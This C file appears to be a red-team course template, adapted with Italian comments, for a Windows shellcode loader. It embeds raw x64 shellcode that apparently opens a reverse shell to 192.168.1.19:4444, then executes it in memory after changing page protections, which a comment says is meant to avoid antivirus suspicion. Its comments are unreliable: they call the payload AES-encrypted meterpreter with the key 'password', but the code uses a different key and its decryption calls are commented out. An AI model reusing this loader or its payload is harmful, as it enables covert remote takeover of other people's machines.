/*

 Red Team Operator course code template
 payload encryption with AES
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>



void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;  // puntatore a memoria allocata in READ & WRITE
	BOOL rv;          // return value di VirtualProtect
	HANDLE th;        // Handle al thread
    DWORD oldprotect = 0; // non lo so, do

    FreeConsole();

	char key[] = "chiavedimmerda";  // password per decryptare il mio payload
    //meterpreter criptato in AES 256 con chiave "password"
	unsigned char calc_payload[] =  
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x48\x8b\x52\x18"
"\x48\x8b\x52\x20\x56\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x8b\x48\x18\x50\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x13\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";
    //{ 0x5, 0xb, 0xc, 0x59, 0x4e, 0x3, 0x54, 0x59, 0x5d, 0x5d, 0x55, 0x42, 0x52, 0x51, 0x5b, 0x51, 0xc, 0x54, 0x45, 0x54, 0x0, 0x5b, 0x5b, 0x59, 0x5d, 0x10, 0x51, 0x53, 0x50, 0x58, 0x51, 0x3, 0x43, 0x57, 0x54, 0xa, 0x55, 0xf, 0x50, 0x40, 0x55, 0x55, 0x53, 0xe, 0xb, 0x56, 0x42, 0x4, 0x56, 0x5f, 0x55, 0xf, 0x52, 0x40, 0x56, 0x59, 0x50, 0x59, 0xf, 0x7, 0x45, 0x54, 0x7, 0x59, 0xc, 0xe, 0x56, 0x11, 0x52, 0x50, 0x54, 0xb, 0x59, 0x53, 0x44, 0x6, 0x56, 0x59, 0xe, 0x5c, 0x6, 0x14, 0x54, 0x5, 0x53, 0x59, 0xa, 0x56, 0x42, 0x5c, 0x53, 0x5c, 0x8, 0xb, 0x50, 0x40, 0x5c, 0x3, 0x56, 0x5a, 0x58, 0x51, 0x4e, 0x7, 0x50, 0x5b, 0x5e, 0xe, 0x55, 0x43, 0x0, 0x51, 0x56, 0x5f, 0x51, 0x3, 0x42, 0x55, 0x53, 0x51, 0x55, 0x58, 0x6, 0x42, 0x53, 0x55, 0x57, 0xb, 0x59, 0x50, 0x12, 0x55, 0x5c, 0xb, 0x59, 0x55, 0x54, 0x4a, 0x51, 0x51, 0x5b, 0xa, 0x5c, 0x59, 0x44, 0x55, 0x54, 0x58, 0x9, 0x5e, 0x5d, 0x47, 0x7, 0x58, 0x54, 0x5c, 0x5a, 0x2, 0x42, 0x5c, 0x5c, 0xb, 0x5e, 0x59, 0x5d, 0x10, 0x54, 0x50, 0x7, 0x5e, 0x5a, 0x50, 0x10, 0x3, 0x57, 0x58, 0xe, 0x5d, 0x4, 0x11, 0x7, 0x50, 0x0, 0xe, 0x59, 0x5, 0x46, 0x54, 0x7, 0x5e, 0x5e, 0x55, 0x0, 0x42, 0x53, 0x54, 0x5, 0x5c, 0x59, 0x52, 0x41, 0x1, 0x2, 0x51, 0x5e, 0xf, 0x52, 0x16, 0x56, 0x55, 0x54, 0x5d, 0xc, 0x51, 0x43, 0x5d, 0x5c, 0xb, 0x58, 0x55, 0x57, 0x46, 0x54, 0x50, 0x7, 0x5b, 0x5f, 0x57, 0x4e, 0x7, 0x54, 0xa, 0x59, 0xf, 0x5d, 0x10, 0x51, 0x59, 0x52, 0xb, 0x59, 0x50, 0x12, 0x56, 0x5c, 0xb, 0x5d, 0x59, 0x5d, 0x10, 0x54, 0x50, 0x7, 0x58, 0x51, 0x58, 0x42, 0x51, 0x56, 0x5d, 0x5f, 0x59, 0x50, 0x10, 0x51, 0x3, 0x55, 0x59, 0x5c, 0x58, 0x43, 0x4, 0x51, 0x58, 0xb, 0xb, 0x0, 0x42, 0x51, 0x59, 0x56, 0xe, 0x5c, 0x0, 0x4e, 0x7, 0x55, 0x5b, 0x8, 0x54, 0x5d, 0x42, 0x2, 0x7, 0x5, 0xe, 0xf, 0x7, 0x43, 0x1, 0x52, 0x51, 0x5e, 0x5e, 0x56, 0x40, 0x54, 0x51, 0x53, 0x58, 0x5f, 0x59, 0x41, 0x52, 0x53, 0x5a, 0x5e, 0x5f, 0x50, 0x14, 0x51, 0x55, 0x55, 0x50, 0x5d, 0x2, 0x41, 0x52, 0x56, 0x5f, 0x5d, 0x5a, 0x5d, 0x4b, 0x1, 0x59, 0x5, 0xe, 0xd, 0x51, 0x14, 0x5d, 0x5d, 0x59, 0x5d, 0x5c, 0x55, 0x42, 0x54, 0x51, 0x51, 0x51, 0xa, 0x55, 0x43, 0x51, 0x51, 0x59, 0x5b, 0x55, 0x57, 0x4b, 0x5c, 0x51, 0x55, 0xa, 0x59, 0x51, 0x10, 0x3, 0x0, 0x5c, 0x5b, 0xc, 0x55, 0x13, 0x52, 0x59, 0x0, 0x58, 0x8, 0x59, 0x46, 0x54, 0x55, 0x5a, 0x5b, 0x55, 0x55, 0x40, 0x54, 0x51, 0x52, 0x59, 0x5c, 0x2, 0x4e, 0x5c, 0x1, 0x5f, 0x58, 0x5d, 0x50, 0x42, 0x51, 0x51, 0x56, 0x58, 0x5d, 0x51, 0x43, 0x55, 0x50, 0x59, 0x58, 0x5d, 0x53, 0x4a, 0x1, 0x0, 0x53, 0xe, 0xd, 0x7, 0x13, 0x55, 0x2, 0xf, 0x9, 0x58, 0x5c, 0x45, 0x52, 0x0, 0x52, 0x58, 0x5c, 0x57, 0x43, 0x52, 0x52, 0x51, 0x54, 0x54, 0x4, 0x47, 0x53, 0x55, 0x55, 0x59, 0xf, 0x7, 0x12, 0x50, 0x5c, 0x5c, 0xe, 0x5d, 0x52, 0x46, 0x54, 0x0, 0x5, 0xe, 0x5d, 0x4, 0x46, 0x5d, 0x53, 0x5c, 0x8, 0xe, 0x0, 0x4a, 0x52, 0x56, 0x53, 0x58, 0x59, 0x51, 0x46, 0x55, 0x52, 0x8, 0x5d, 0x5d, 0x53, 0x13, 0x54, 0x55, 0x56, 0x5e, 0x5c, 0x56, 0x40, 0x5d, 0x54, 0x5b, 0x9, 0x54, 0x6, 0x4a, 0x51, 0x7, 0x5, 0xe, 0xd, 0x54, 0x4e, 0x56, 0x2, 0x51, 0x5d, 0x5d, 0x52, 0x17, 0x57, 0x57, 0x5b, 0xa, 0x5a, 0x57, 0x40, 0x4, 0x50, 0x59, 0x5b, 0x55, 0x55, 0x42, 0x55, 0x51, 0x53, 0x58, 0x59, 0x51, 0x43, 0x53, 0x52, 0x8, 0x5d, 0x5d, 0x53, 0x4a, 0x51, 0x59, 0x2, 0x5c, 0x5c, 0x52, 0x13, 0x50, 0x2, 0xf, 0x9, 0x58, 0x5c, 0x41, 0x51, 0x52, 0x55, 0x9, 0x59, 0x51, 0x43, 0x53, 0x51, 0x5a, 0x58, 0x5a, 0x53, 0x4a, 0x54, 0x53, 0x7, 0x51, 0xa, 0x59, 0x43, 0x3, 0x2, 0xf, 0x9, 0x58, 0x5d, 0x41, 0x2, 0x59, 0x53, 0x58, 0x5e, 0x5, 0x44, 0x5d, 0x51, 0x51, 0x5b, 0x55, 0x55, 0x42, 0x50, 0x51, 0x53, 0x58, 0x59, 0x51, 0x40, 0x4, 0x54, 0x59, 0x58, 0x5d, 0x53, 0x4a, 0x54, 0x3, 0x51, 0xe, 0x59, 0x7, 0x45, 0x55, 0x2, 0xf, 0x9, 0x58, 0x50, 0x45, 0x52, 0x59, 0x54, 0x5d, 0x5f, 0x4, 0x42, 0x1, 0x52, 0x58, 0xb, 0xb, 0x1, 0x47, 0x51, 0x4, 0x56, 0xd, 0xf, 0x7, 0x46, 0x6, 0x56, 0x5d, 0x5d, 0xb, 0x5d, 0x47, 0x53, 0x51, 0x5, 0xe, 0xf, 0x7, 0x10, 0x3, 0x1, 0x50, 0x54, 0xf, 0x3, 0x14, 0x2, 0x7, 0x5, 0xe, 0x59, 0x50, 0x15, 0x56, 0x56, 0x50, 0xe, 0x5b, 0x52, 0x47, 0x7, 0x50, 0x0, 0x5b, 0xb, 0x3, 0x10, 0x55, 0x6, 0x5c, 0xc, 0x5f, 0x50, 0x44, 0x52, 0x0, 0x53, 0x58, 0x5c, 0x52, 0x10, 0x3, 0x0, 0x5c };

	unsigned int calc_len = sizeof(calc_payload);
	
	// prima alloco memoria read-write per il payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);


	// Decripta il payload
	//AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
	//XOR((char *) calc_payload, calc_len, key, sizeof(key));

    printf("0x%02x\n", calc_payload[0]);

	
	// copio il payload nel buffer allocato prima con VirtualAlloc
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Ora rendo il buffer eseguibile perche' allocar subito il buffer Read Write e Execute puo' insospettire gli AV
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

    //se tutto ok lancia il payload
	if ( rv != 0 ) {        
        printf("DENTRO IL THREAD\n");
        //inizializzo un thread che in callback esegue il codice nel buffer
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); 
        WaitForSingleObject(th, INFINITE); //aspetto che il thread finisca
	}
    
	return 0;
}
